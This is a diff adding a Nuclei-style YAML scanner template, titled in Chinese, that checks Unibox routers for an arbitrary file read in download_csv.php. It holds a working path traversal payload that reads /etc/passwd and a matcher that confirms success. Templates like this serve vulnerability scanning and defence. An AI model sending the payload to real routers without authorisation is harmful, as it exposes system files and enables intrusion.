@@ -1,0 +1,34 @@
+id: unibox-download_csv-fileread
+info:
+  name: Unibox路由器download_csv.php任意文件读取
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/Unibox/Unibox%E8%B7%AF%E7%94%B1%E5%99%A8download_csv.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileread,unibox
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tools/download_csv.php?download_file=../../../etc/passwd"
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
